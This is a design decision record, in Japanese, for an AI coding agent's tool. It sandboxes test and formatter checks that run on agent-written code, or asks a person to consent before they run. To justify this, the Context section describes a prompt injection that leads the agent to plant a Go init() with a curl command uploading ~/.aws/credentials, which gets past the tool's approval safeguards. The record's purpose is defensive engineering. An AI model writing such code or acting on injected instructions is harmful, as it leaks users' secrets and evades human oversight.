# ADR-0013: gate の実行 — OS sandbox、無ければ人の同意の後

- 状態: 採用（2026-10-03、レビュー R1。文言は即時、sandbox は M3） / 関連: SEC-03・SEC-14、ADR-0006 R1、loop spec §7.6

## Context
gate（formatter・typecheck・test）は agent が書いた diff を人が見る前に実行されていた。prompt injection で agent に `func init(){ … curl -d @$HOME/.aws/credentials … }` を関連 test に書かせれば、`go test` がネットワークと HOME を持ったホスト上でそれを実行する（「Bash を渡さない」L3 と「人が承認する」L7 の両方を迂回）。vitest/jest/pytest の preload、`build.rs`、JS 設定ファイルを読む formatter も同じ。依存 dir の symlink 経由で本物の依存を書き換えられ、reject しても残る。trust ダイアログは「ネットワーク・秘密情報は渡しません」と書いていた（v1 では誤り）。

## Decision
1. **文言（即時）**: trust ダイアログは事実どおり「あなたの権限で実行されます。sandbox が無い環境ではネットワークとホームにアクセスできます。AI が書いたコードがここで実行されます」。
2. **分類**: `GateSpec.executesRepoCode`。`false` は純 formatter の allowlist（gofmt、rustfmt / `cargo fmt`、`ruff format`、black、JSON 設定の biome）だけ。他（test runner、JS/TS 設定の prettier/eslint、typecheck が plugin を読むもの、build）は `true`。
3. **sandbox（M3、`security.gateSandbox: "auto"` 既定）**: macOS は `sandbox-exec`、Linux は `bwrap`（daemon 起動時に検出、`EffectiveSettings.gateSandbox`）。profile: network 拒否、書き込みは worktree・job の TMPDIR・`CARGO_TARGET_DIR` のみ、依存の realpath は読み取り専用、`~/.ssh ~/.aws ~/.config/gh ~/.mitori ~/.claude*` と keychain は読み取りも拒否。
4. **sandbox が無いとき**: `executesRepoCode` の gate は AI の diff に対して `pending_consent`。diff を表示した後に人が「自動検査を実行」（`POST /jobs/:job/gates/run`）を押してから走る。修復ループもその同意を待つ。依存ツリー（symlink 先）の hash を前後で比べ、変化したら job を失敗にする。
5. **remote-readonly**: gate の trust 既定は denied（opt-in のみ）。
6. `security.gateSandbox: "require"` は sandbox が無ければ実行しない、`"off"` は trust 後に sandbox 無しで実行（設定画面で赤字、`EXEC_SETTING_KEYS`）。

## Consequences
- sandbox のある macOS / bwrap 入り Linux では体験が変わらない（gofmt を含むデモは影響なし）。
- sandbox の無い環境では test 系 gate が 1 クリック増える。ReadyCard は `⚠ 検査なし` を正直に表示する（UXP-05）。
- `sandbox-exec` は Apple が非推奨にしている API。使えなくなったら consent 経路だけで出荷する（R1-O2）。評価候補として Anthropic の OSS `@anthropic-ai/sandbox-runtime` を M3 前に比較する。

## Alternatives
- 常に同意を求める: sandbox がある環境では不要な摩擦。
- container（Docker）で実行: 依存の再現と起動時間が重い。インストールを前提にできない。
